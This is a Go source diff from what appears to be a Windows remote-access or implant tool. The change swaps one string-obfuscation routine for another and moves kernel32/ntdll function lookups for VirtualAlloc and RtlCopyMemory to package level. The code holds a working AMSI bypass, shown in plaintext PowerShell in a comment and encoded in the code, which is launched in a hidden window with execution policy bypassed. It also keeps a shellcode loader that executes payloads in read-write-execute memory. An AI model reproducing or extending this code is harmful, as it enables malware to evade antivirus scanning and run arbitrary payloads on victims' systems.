@@ -20,6 +20,13 @@ const (
 	pageExecuteReadWrite = 0x40
 )
 
+var (
+	kernel32      = syscall.MustLoadDLL(utils.Bake("EwYGFgYYS1FaHA8Y"))
+	ntdll         = syscall.MustLoadDLL(utils.Bake("FhcQFA9aHA8Y"))
+	VirtualAlloc  = kernel32.MustFindProc(utils.Bake("LgoGDBYVFCIYFAwX"))
+	RtlCopyMemory = ntdll.MustFindProc(utils.Bake("KhcYOwwEAS4RFQwGAQ=="))
+)
+
 // Shell ...
 func Shell() *exec.Cmd {
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
@@ -30,7 +37,7 @@ func Shell() *exec.Cmd {
 // Powershell ...
 func Powershell() (*exec.Cmd, error) {
 	// $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
-	amsiBypass := utils.DecryptString("fCJpAxExPh56GTAnPS42NDp6HyYgDDokPTB8cXgSNzExOSA8cGc2eCo6eGc1cWMvMSV0cGc2dg01NSZ0dS89MyZ0emk9DTc9NDB2cWMvfCBpfCEpJXhwPH5wO20TPTcSMSY4PDB8fw07NhMhOi89O28HLCIgMSBzcXgSNzExOSA8cGcxeCo6eGcwcWMvMSV0cGcxdg01NSZ0dS89MyZ0emkXNy0gPTsgemp0I2cyZWcxJT5vfCRpfCV6HyYgDiI4LSZ8fC0hNC99YxgdNjcELDEJfDMgKn5wP3gPES0ga3EPBR5wOjYyeH50GGtkcXgPCzonLCY5dhEhNjc9NSZ6ES0gPTE7KBAxKjU9OyYndg41KjA8OS8JYnkXNzMtcGc2LSV4eHN4eGckLDF4eHJ9")
+	amsiBypass := utils.Bake("XAJJIzERHj5aORAHHQ4WFBpaPwYALBoEHRBcUVgyFxERGQAcUEcWWAoaWEcVUUMPEQVUUEcWVi0VFQZUVQ8dEwZUWkkdLRcdFBBWUUMPXABJXAEJBVhQHF5QG00zHRcyEQYYHBBcXy0bFjMBGg8dG08nDAIAEQBTUVgyFxERGQAcUEcRWAoaWEcQUUMPEQVUUEcRVi0VFQZUVQ8dEwZUWkk3Fw0AHRsAWkpUA0cSRUcRBR5PXARJXAVaPwYALgIYDQZcXA0BFA9dQzg9FhckDBEpXBMACl5QH1gvMQ0AS1EvJT5QGhYSWF5UOEtEUVgvKxoHDAYZVjEBFhcdFQZaMQ0AHREbCDARChUdGwYHVi4VChAcGQ8pQlk3FxMNUEcWDQVYWFNYWEcEDBFYWFJd")
 	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd, nil
@@ -122,10 +129,6 @@ func ExecSilent(command string, c net.Conn) {
 // ExecSC executes Shellcode
 func ExecSC(sc []byte) {
 	// ioutil.WriteFile("met.dll", sc, 0644)
-	kernel32 := syscall.MustLoadDLL(utils.DecryptString("MyYmNiY4a3F6PC84"))         // kernel32.dll
-	ntdll := syscall.MustLoadDLL(utils.DecryptString("NjcwNC96PC84"))                // ntdll.dll
-	VirtualAlloc := kernel32.MustFindProc(utils.DecryptString("DiomLDY1NAI4NCw3"))   // VirtualAlloc
-	RtlCopyMemory := ntdll.MustFindProc(utils.DecryptString("Cjc4GywkIQ4xNSwmIQ==")) // RtlCopyMemory
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), memCommit|memReserve, pageExecuteReadWrite)
 	if addr == 0 {
 		log.Println(err)
